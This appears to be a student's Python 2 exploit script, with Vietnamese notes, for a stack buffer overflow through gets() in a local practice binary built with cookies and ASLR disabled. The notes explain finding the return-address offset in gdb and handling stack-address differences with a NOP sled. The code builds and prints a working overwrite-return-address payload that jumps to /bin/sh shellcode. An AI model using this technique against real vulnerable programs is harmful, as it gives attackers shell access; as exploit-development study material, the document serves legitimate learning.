#!/usr/bin/python
# -*- coding: utf-8 -*-
import sys
import struct
'''
nhận thấy lỗi xảy ra ở hàm gets, nó cho phép ghi tràn
lên địa chỉ trả về (vì khi biên dịch ta đã tắt cookie)
dùng gdb debug, tìm khoảng cách giữa buffer và ret Address
để ghi đè

ta đặt breakpoint tại call gets@plt để lấy địa chỉ
của buffer
lấy địa chỉ của ret ở dưới ebp

ghi đè lên xem tới được eip chưa
thấy eip = 0x42424242 => đã ghi đè đúng

ta dùng shellcode binsh đã biên tập sẵn từ trước

vì gets cần tránh '\n' nên ta kiểm tra xem trong
binsh có '\n' không => OK
ta đặt shellcode ngay sau ret
cũng nên kiểm tra xem payload chứa '\n' không
đã chạy được binsh

giờ bật printHello trực tiếp trên bash
khi bật trong gdb và trong bash, địa chỉ stack
khác nhau (dù đã tắt aslr)
nên ta sẽ cho shellcode nhảy đến đống '\x90'
cần phải dùng print để nó in ra ký tự '\n'
thì gets mới bị ngắt tại đó. hoặc...
như vậy, có thể truyền tiếp dữ liệu vào cho binsh
ta tạo vòng lặp để có thể tương tác
khai thác thành công :)


nhận xét:
	+ sử dụng khối '\x90' trước shellcode để có 
	thể nhảy tương đối
	+ địa chỉ stack khi chạy trong bash khác
	khi chạy trong gdb (có lẽ do các biến môi trường)
	+ hàm gets chỉ cần tránh ký tự '\n'
	
trong gdb:
đáy stack = 0xffffe000
khi main được gọi -> esp = 0xffffe000 + 400 (giả sử, vùng nhớ lưu biến môi trường; parent_process="gdb")
địa chỉ shellcode là 0xffffe450

nhưng khi chạy chương trình ngoài terminal
đáy stack = 0xffffe000
khi main được gọi -> esp = 0xffffe000 + 300 (giả sử, vùng nhớ lưu biến môi trường; parent_process="terminal")
địa chỉ shellcode là 0xffffe350
'''

bufAddr = 0xbffff66c # 0xffffd4cc
retAddr = 0xbffff68c # 0xffffd4ec

shellcode = open('binsh', 'rb').read()
shellcodeAddr = 0xffffd4ec+0x100 # retAddr+4+0x100


# payload = shellcode + 'A'*(retAddr-bufAddr-len(shellcode)) + '\xcc\xd4\xff\xff'
# payload += '\nls;ls;'

payload = 'A'*(retAddr-bufAddr) \
	+struct.pack('<I', shellcodeAddr)\
	+'\x90'*0x200 \
	+shellcode
	

print payload
sys.stdout.flush()

print 'ls'
# sys.stdout.write(payload)
# sys.stdout.write('\n')
# sys.stdout.flush()

# while True:
	# mStr = raw_input()
	# sys.stdout.write(mStr)
	# sys.stdout.write('\n')
	# sys.stdout.flush()
	# if mStr == 'exit':
		# exit(0)



